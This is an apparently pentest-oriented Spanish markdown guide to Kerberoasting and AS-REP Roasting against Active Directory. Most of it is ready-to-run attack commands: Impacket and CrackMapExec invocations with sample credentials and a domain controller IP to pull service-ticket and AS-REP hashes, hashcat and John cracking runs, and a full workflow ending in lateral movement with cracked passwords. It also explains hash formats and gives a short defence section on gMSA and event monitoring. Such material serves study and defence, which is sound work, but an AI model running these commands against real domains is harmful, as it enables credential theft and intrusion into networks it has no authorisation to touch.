# Ataques Kerberos — Kerberoasting y AS-REP Roasting

Los ataques a Kerberos son de los más efectivos en entornos AD porque:
- Explotan el **propio protocolo de autenticación** (no una vulnerabilidad)
- El crackeo es **100% offline** — no se genera ruido en el DC
- Afectan a dominios completamente parcheados

---

## Kerberoasting (T1558.003)

### Concepto

```
  [Atacante]                    [DC]
      │                           │
      │── TGT Request ───────────►│
      │◄─ TGT ────────────────────│
      │                           │
      │── TGS Request (SPN) ─────►│  ← Cualquier usuario puede hacer esto
      │◄─ TGS cifrado con ────────│
      │   NTLM del svc account    │
      │                           │
  [Crackeo offline]
  hashcat -m 13100 hash.txt rockyou.txt
```

### Usuarios vulnerables

Un usuario es Kerberoastable si:
- Tiene el atributo `servicePrincipalName` configurado
- La cuenta está **activa**
- La contraseña es **débil** (para que el crackeo tenga éxito)

### Comandos

```bash
# Impacket (recomendado desde Kali)
impacket-GetUserSPNs empresa.local/juan:Password123! \
    -dc-ip 192.168.1.10 \
    -request \
    -outputfile kerberoast_hashes.txt

# CrackMapExec
crackmapexec ldap 192.168.1.10 -u juan -p Password123! \
    --kerberoasting kerberoast_hashes.txt

# Script propio
python3 scripts/kerberoast.py \
    --dc 192.168.1.10 --domain empresa.local \
    -u juan -p Password123! -o hashes.txt

# Crackeo offline
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule

# John
john kerberoast_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Formato del hash capturado

```
$krb5tgs$23$*svc-sql$EMPRESA.LOCAL$MSSQLSvc/db01.empresa.local:1433*$a3b4...
  └── Tipo: 23 (RC4, más débil)
  └── Usuario: svc-sql
  └── Dominio: EMPRESA.LOCAL
  └── SPN: MSSQLSvc/db01.empresa.local:1433
  └── Hash cifrado (crackeable)
```

> **Nota:** RC4 (tipo 23) es mucho más rápido de crackear que AES (tipo 17/18).
> Si aparece tipo 17 o 18, el dominio usa cifrado AES — más resistente.

### Defensa

- Contraseñas largas (>25 chars) en cuentas de servicio
- Usar **Managed Service Accounts (MSA)** o **Group MSA (gMSA)**
- Monitorizar el EventID 4769 con EncryptionType 0x17 (RC4)
- Limitar usuarios con SPN al mínimo necesario

---

## AS-REP Roasting (T1558.004)

### Concepto

```
  [Atacante]                    [DC]
      │                           │
      │── AS-REQ (sin pre-auth) ─►│  ← No necesita contraseña
      │◄─ AS-REP cifrado ─────────│
      │   con hash del usuario    │
      │                           │
  [Crackeo offline]
  hashcat -m 18200 hash.txt rockyou.txt
```

### Usuarios vulnerables

Un usuario es AS-REP Roastable si:
- Tiene el flag `DONT_REQ_PREAUTH` activo en `userAccountControl`
- La cuenta está activa

> **No necesitas credenciales** para ejecutar AS-REP Roasting si conoces el nombre del usuario.

### Comandos

```bash
# Con credenciales — enumerar y atacar
impacket-GetNPUsers empresa.local/juan:Password123! \
    -dc-ip 192.168.1.10 \
    -request \
    -format hashcat \
    -outputfile asrep_hashes.txt

# Sin credenciales — solo con lista de usuarios
impacket-GetNPUsers empresa.local/ \
    -dc-ip 192.168.1.10 \
    -usersfile usuarios.txt \
    -no-pass \
    -format hashcat \
    -outputfile asrep_hashes.txt

# CrackMapExec
crackmapexec ldap 192.168.1.10 -u juan -p Password123! --asreproast asrep_hashes.txt

# Crackeo offline
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

### Formato del hash

```
$krb5asrep$23$maria.lopez@EMPRESA.LOCAL:a3b4c5...
  └── Tipo: 18200 en hashcat
  └── Usuario: maria.lopez
  └── Hash del AS-REP
```

---

## Comparativa de los ataques

| | Kerberoasting | AS-REP Roasting |
|--|---------------|-----------------|
| Necesita credenciales | Sí (cualquier usuario) | No (si conoces usernames) |
| Objetivo | Cuentas con SPN | Cuentas sin pre-auth |
| Hash obtenido | TGS (krb5tgs) | AS-REP (krb5asrep) |
| Hashcat mode | 13100 | 18200 |
| Detección | EventID 4769 | EventID 4768 |
| Prevalencia | Alta | Media |

---

## Workflow completo desde cero

```bash
# 1. Enumerar usuarios vulnerables
python3 ../01-Reconocimiento/scripts/ad_enum.py \
    --dc 192.168.1.10 --domain empresa.local -u juan -p Pass123

# 2. Kerberoasting (si hay SPNs)
python3 scripts/kerberoast.py \
    --dc 192.168.1.10 --domain empresa.local -u juan -p Pass123

# 3. AS-REP Roasting (si hay usuarios sin pre-auth)
impacket-GetNPUsers empresa.local/juan:Pass123 -dc-ip 192.168.1.10 \
    -request -format hashcat -outputfile asrep.txt

# 4. Crackeo
hashcat -m 13100 kerberoast_*.txt /usr/share/wordlists/rockyou.txt &
hashcat -m 18200 asrep.txt        /usr/share/wordlists/rockyou.txt &

# 5. Usar las credenciales obtenidas
# Si svc-sql tiene privilegios: lateral movement
crackmapexec smb 192.168.1.0/24 -u svc-sql -p 'CrackedPassword!'
```
EOF
echo "kerberos-attacks.md OK"